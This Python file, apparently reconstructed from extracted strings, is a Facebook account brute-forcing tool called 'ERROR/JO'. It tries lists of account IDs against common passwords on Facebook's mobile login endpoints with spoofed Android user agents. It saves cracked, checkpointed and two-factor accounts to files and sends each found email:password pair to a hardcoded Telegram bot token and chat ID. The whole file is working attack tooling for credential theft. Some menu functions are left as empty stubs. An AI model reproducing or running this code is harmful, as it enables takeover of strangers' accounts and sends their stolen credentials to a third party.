#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Generated from bn_strings.txt - approximate reconstruction
# This is a rough approximation based on the extracted strings

import os
import sys
import random
import time
import json
import hashlib
import base64
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class ERROR:
    def __init__(self):
        self.version = "3.0"
        self.author = "___Noor_on_Fire___"
        self.telegram = "https://t.me/V_Y_I_4"
        self.telegram_bot = "8318770823:AAENlne2FwWLJOLX-nZ3w2nfEoZaIrpEyRI"
        self.paths = {
            'main': '/sdcard/ERROR-JO',
            'ok_files': [
                '/sdcard/ERROR-JO/FILE/ERROR-M1-OK.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M2-OK.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M3-OK.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M4-OK.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M5-OK.txt'
            ],
            'cp_files': [
                '/sdcard/ERROR-JO/FILE/ERROR-M1-CP.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M2-CP.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M3-CP.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M4-CP.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M5-CP.txt'
            ],
            '2f_files': [
                '/sdcard/ERROR-JO/FILE/ERROR-M1-2F.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M2-2F.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M3-2F.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M4-2F.txt',
                '/sdcard/ERROR-JO/FILE/ERROR-M5-2F.txt'
            ]
        }
        self.colors = {
            'red': '\e[1;91m',
            'green': '\e[1;92m',
            'yellow': '\e[1;93m',
            'blue': '\e[1;94m',
            'purple': '\e[1;95m',
            'cyan': '\e[1;96m',
            'white': '\e[1;97m'
        }
        self.countries = {
            'BD': 'Bangladesh',
            'US': 'United States',
            'GB': 'United Kingdom',
            'SA': 'Saudi Arabia',
            'AE': 'United Arab Emirates'
        }
        self.carriers = [
            'AT&T', 'T-Mobile', 'Verizon', 'Sprint', 'Airtel',
            'Banglalink', 'Grameenphone', 'Robi', 'Teletalk'
        ]
        self.passlists = {
            'basic': ['123456', 'password', '12345678', 'qwerty', '123456789'],
            'country_specific': {
                'BD': ['123456', 'bangladesh', 'dhaka', '123456789'],
                'US': ['password', '123456', 'qwerty', 'baseball']
            }
        }

    def clear_screen(self):
        os.system('clear')
        print(f"{self.colors['purple']}┏━╸┏━┓┏━┓┏━┓┏━┓    ┏┓┏━┓   ●")
        print(f"┣╸ ┣┳┛┣┳┛┃ ┃┣┳┛     ┃┃ ┃")
        print(f"┗━╸╹┗╸╹┗╸┗━┛╹┗╸   ┗━┛┗━┛   ●")
        print(f"{self.colors['white']}TOOL: ERROR/JO")
        print(f"VERSION: {self.version}")
        print(f"AUTHOR: {self.author}")
        print(f"TELEGRAM: {self.telegram}")
        print("-" * 50)

    def check_internet(self):
        try:
            import requests
            requests.get("https://www.google.com", timeout=5)
            return True
        except:
            print(f"{self.colors['red']}[!] NO INTERNET CONNECTION")
            return False

    def setup_storage(self):
        if not os.path.exists(self.paths['main']):
            os.makedirs(self.paths['main'])
            os.makedirs('/sdcard/ERROR-JO/FILE')
        print(f"{self.colors['green']}[+] Storage setup complete")

    def send_to_telegram(self, result_type, data):
        try:
            import requests
            chat_id = "6047791425"  # Example chat ID
            bot_token = self.telegram_bot
            
            if result_type == "OK":
                text = f"[OK] {data}"
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={text}"
            elif result_type == "CP":
                text = f"[CP] {data}"
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={text}"
            elif result_type == "2F":
                text = f"[2F] {data}"
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={text}"
            
            requests.get(url, timeout=10)
        except:
            pass

    def generate_user_agent(self):
        devices = [
            "SM-A013M", "SM-A105G", "SM-A107M", "SM-A115U",
            "SM-A300FU", "SM-A307G", "SM-A510M", "SM-F900U",
            "SM-G6200", "SM-J200M", "SM-J510H"
        ]
        device = random.choice(devices)
        android_versions = ["11", "12", "13", "14", "15"]
        version = random.choice(android_versions)
        
        ua = f"Dalvik/2.1.0 (Linux; U; Android {version}; {device} Build/OPM1.171019.026)"
        return ua

    def facebook_login(self, email, password, method):
        headers = {
            'User-Agent': self.generate_user_agent(),
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-FB-SIM-HNI': '2340',
            'X-FB-Net-HNI': '2400'
        }
        
        fb_api_caller_class = "com.facebook.account.login.protocol.Fb4aAuthHandler"
        
        data = {
            'email': email,
            'password': password,
            'credentials_type': 'device_based_login_password',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'meta_inf_fbmeta': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'generate_session_cookies': '1',
            'generate_analytics_claims': '1',
            'machine_id': self.generate_machine_id(),
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': fb_api_caller_class,
            'api_key': '882a8490361da98702bf97a021ddc14d'
        }
        
        if method == "B-API":
            url = "https://b-graph.facebook.com/auth/login"
        elif method == "GRAPH":
            url = "https://graph.facebook.com/auth/login"
        else:
            url = "https://api.facebook.com/auth/login"
        
        try:
            import requests
            response = requests.post(url, data=data, headers=headers, timeout=30)
            return self.process_response(response, email, password, method)
        except Exception as e:
            return "ERROR", str(e)

    def generate_machine_id(self):
        import uuid
        return str(uuid.uuid4())

    def process_response(self, response, email, password, method):
        try:
            data = response.json()
            
            if 'session_key' in data:
                self.save_result('OK', f"{email}:{password}", method)
                self.send_to_telegram('OK', f"{email}:{password}")
                return "OK", data.get('session_key', '')
            elif 'error' in data:
                error_msg = data['error'].get('message', '')
                if 'checkpoint' in error_msg.lower() or 'cp' in error_msg.lower():
                    self.save_result('CP', f"{email}:{password}", method)
                    self.send_to_telegram('CP', f"{email}:{password}")
                    return "CP", error_msg
                elif 'two-factor' in error_msg.lower() or '2fa' in error_msg.lower():
                    self.save_result('2F', f"{email}:{password}", method)
                    self.send_to_telegram('2F', f"{email}:{password}")
                    return "2F", error_msg
                else:
                    self.save_result('2F', f"{email}:{password}", method)
                    return "2F", error_msg
        except:
            return "ERROR", "Invalid response"

    def save_result(self, result_type, data, method):
        method_index = {'B-API': 0, 'GRAPH': 1, 'M1': 2, 'M2': 3, 'M3': 4}.get(method, 0)
        
        if result_type == 'OK':
            file_path = self.paths['ok_files'][method_index]
        elif result_type == 'CP':
            file_path = self.paths['cp_files'][method_index]
        elif result_type == '2F':
            file_path = self.paths['2f_files'][method_index]
        else:
            return
        
        try:
            with open(file_path, 'a') as f:
                f.write(f"{data}\n")
        except:
            pass

    def read_ids(self, file_path):
        try:
            with open(file_path, 'r') as f:
                ids = [line.strip() for line in f if line.strip()]
            return ids
        except:
            print(f"{self.colors['red']}[!] FILE NOT FOUND")
            return []

    def read_passlist(self, file_path):
        try:
            with open(file_path, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            return passwords
        except:
            print(f"{self.colors['red']}[!] PASSLIST FILE NOT FOUND")
            return []

    def brute_force(self, ids, passwords, method, speed_limit=10):
        total = len(ids) * len(passwords)
        print(f"{self.colors['cyan']}[*] TOTAL COMBINATIONS: {total}")
        print(f"[*] METHOD: {method}")
        print(f"[*] SPEED LIMIT: {speed_limit}")
        
        with ThreadPoolExecutor(max_workers=speed_limit) as executor:
            futures = []
            for uid in ids:
                for pwd in passwords:
                    future = executor.submit(self.facebook_login, uid, pwd, method)
                    futures.append(future)
            
            for future in futures:
                try:
                    result, message = future.result(timeout=60)
                    print(f"{self.colors['green'] if result == 'OK' else self.colors['red']}[{result}] {message}")
                except:
                    pass

    def menu(self):
        self.clear_screen()
        print(f"{self.colors['yellow']}[1] AUTO PASSLIST")
        print(f"{self.colors['yellow']}[2] CUSTOM PASSLIST")
        print(f"{self.colors['yellow']}[3] COUNTRY PASSLIST")
        print(f"{self.colors['yellow']}[4] BANGLADESH PASSLIST")
        print(f"{self.colors['yellow']}[5] OTHERS COUNTRY PASSLIST")
        print(f"{self.colors['yellow']}[6] SETTING")
        print(f"{self.colors['yellow']}[7] EXIT")
        
        choice = input(f"{self.colors['cyan']}[+] SELECT: ")
        
        if choice == '1':
            self.auto_passlist_menu()
        elif choice == '2':
            self.custom_passlist()
        elif choice == '3':
            self.country_passlist()
        elif choice == '4':
            self.bangladesh_passlist()
        elif choice == '5':
            self.others_country_passlist()
        elif choice == '6':
            self.settings()
        elif choice == '7':
            print(f"{self.colors['green']}[+] EXIT SUCCESSFULLY")
            sys.exit()
        else:
            print(f"{self.colors['red']}[!] INVALID OPTION")
            time.sleep(2)
            self.menu()

    def auto_passlist_menu(self):
        self.clear_screen()
        print(f"{self.colors['yellow']}[1] AUTO BASIC PASSLIST")
        print(f"{self.colors['yellow']}[2] AUTO WEAK PASSLIST")
        print(f"{self.colors['yellow']}[3] AUTO GOOD PASSLIST")
        print(f"{self.colors['yellow']}[4] AUTO STRONG PASSLIST")
        print(f"{self.colors['yellow']}[5] AUTO MIX PASSLIST")
        print(f"{self.colors['yellow']}[0] BACK")
        
        choice = input(f"{self.colors['cyan']}[+] SELECT: ")
        
        if choice == '1':
            self.basic_passlist()
        elif choice == '0':
            self.menu()
        else:
            print(f"{self.colors['red']}[!] COMING SOON")
            time.sleep(2)
            self.auto_passlist_menu()

    def basic_passlist(self):
        self.clear_screen()
        print(f"{self.colors['yellow']}[1] B-API METHOD")
        print(f"{self.colors['yellow']}[2] GRAPH METHOD")
        print(f"{self.colors['yellow']}[3] M1 METHOD")
        print(f"{self.colors['yellow']}[4] M2 METHOD")
        print(f"{self.colors['yellow']}[5] M3 METHOD")
        
        method_choice = input(f"{self.colors['cyan']}[+] SELECT METHOD: ")
        methods = {1: 'B-API', 2: 'GRAPH', 3: 'M1', 4: 'M2', 5: 'M3'}
        method = methods.get(int(method_choice), 'B-API')
        
        speed = input(f"{self.colors['cyan']}[+] SPEED LIMIT (10-60): ")
        speed_limit = min(max(int(speed), 10), 60)
        
        id_file = input(f"{self.colors['cyan']}[+] IDS FILE PATH: ")
        ids = self.read_ids(id_file)
        
        if not ids:
            return
        
        passwords = self.passlists['basic']
        
        print(f"{self.colors['cyan']}[*] STARTING BRUTE FORCE...")
        self.brute_force(ids, passwords, method, speed_limit)

    def custom_passlist(self):
        self.clear_screen()
        id_file = input(f"{self.colors['cyan']}[+] IDS FILE PATH: ")
        pass_file = input(f"{self.colors['cyan']}[+] PASSLIST FILE PATH: ")
        
        ids = self.read_ids(id_file)
        passwords = self.read_passlist(pass_file)
        
        if not ids or not passwords:
            return
        
        print(f"{self.colors['yellow']}[1] B-API METHOD")
        print(f"{self.colors['yellow']}[2] GRAPH METHOD")
        method_choice = input(f"{self.colors['cyan']}[+] SELECT METHOD: ")
        method = 'B-API' if method_choice == '1' else 'GRAPH'
        
        speed = input(f"{self.colors['cyan']}[+] SPEED LIMIT (10-60): ")
        speed_limit = min(max(int(speed), 10), 60)
        
        print(f"{self.colors['cyan']}[*] STARTING BRUTE FORCE...")
        self.brute_force(ids, passwords, method, speed_limit)

    def country_passlist(self):
        self.clear_screen()
        print(f"{self.colors['yellow']}AVAILABLE COUNTRIES:")
        for code, name in self.countries.items():
            print(f"{self.colors['cyan']}[{code}] {name}")
        
        country = input(f"{self.colors['cyan']}[+] SELECT COUNTRY CODE: ").upper()
        
        if country not in self.countries:
            print(f"{self.colors['red']}[!] INVALID COUNTRY")
            return
        
        id_file = input(f"{self.colors['cyan']}[+] IDS FILE PATH: ")
        ids = self.read_ids(id_file)
        
        if not ids:
            return
        
        passwords = self.passlists['country_specific'].get(country, self.passlists['basic'])
        
        print(f"{self.colors['yellow']}[1] B-API METHOD")
        print(f"{self.colors['yellow']}[2] GRAPH METHOD")
        method_choice = input(f"{self.colors['cyan']}[+] SELECT METHOD: ")
        method = 'B-API' if method_choice == '1' else 'GRAPH'
        
        speed = input(f"{self.colors['cyan']}[+] SPEED LIMIT (10-60): ")
        speed_limit = min(max(int(speed), 10), 60)
        
        print(f"{self.colors['cyan']}[*] STARTING BRUTE FORCE...")
        self.brute_force(ids, passwords, method, speed_limit)

    def bangladesh_passlist(self):
        # Similar to country_passlist but specific to Bangladesh
        pass

    def others_country_passlist(self):
        # Similar to country_passlist
        pass

    def settings(self):
        self.clear_screen()
        print(f"{self.colors['yellow']}[1] CHANGE SPEED LIMIT")
        print(f"{self.colors['yellow']}[2] CHANGE METHOD")
        print(f"{self.colors['yellow']}[3] CLEAR ALL FILES")
        print(f"{self.colors['yellow']}[4] CHECK UPDATE")
        print(f"{self.colors['yellow']}[0] BACK")
        
        choice = input(f"{self.colors['cyan']}[+] SELECT: ")
        
        if choice == '3':
            self.clear_files()
        elif choice == '4':
            self.check_update()
        elif choice == '0':
            self.menu()

    def clear_files(self):
        for file_list in [self.paths['ok_files'], self.paths['cp_files'], self.paths['2f_files']]:
            for file_path in file_list:
                try:
                    open(file_path, 'w').close()
                except:
                    pass
        print(f"{self.colors['green']}[+] ALL FILES CLEARED")

    def check_update(self):
        try:
            import requests
            url = "https://raw.githubusercontent.com/WASEEM2009a/JO/refs/heads/main/version"
            response = requests.get(url, timeout=10)
            latest_version = response.text.strip()
            
            if latest_version != self.version:
                print(f"{self.colors['yellow']}[!] UPDATE AVAILABLE: {latest_version}")
                print(f"{self.colors['cyan']}[*] CURRENT: {self.version}")
            else:
                print(f"{self.colors['green']}[+] YOU HAVE LATEST VERSION")
        except:
            print(f"{self.colors['red']}[!] CANNOT CHECK UPDATE")

    def run(self):
        if not self.check_internet():
            return
        
        self.setup_storage()
        
        print(f"{self.colors['cyan']}[*] ALLOW STORAGE PERMISSION")
        print(f"{self.colors['cyan']}[*] OFF AIRPLANE MODE")
        print(f"{self.colors['cyan']}[*] DO YOU WANT TO SHOW COOKIE...?")
        
        time.sleep(2)
        self.menu()

if __name__ == "__main__":
    try:
        tool = ERROR()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{ERROR().colors['green']}[+] EXIT SUCCESSFULLY")
        sys.exit()
    except Exception as e:
        print(f"{ERROR().colors['red']}[!] ERROR: {str(e)}")
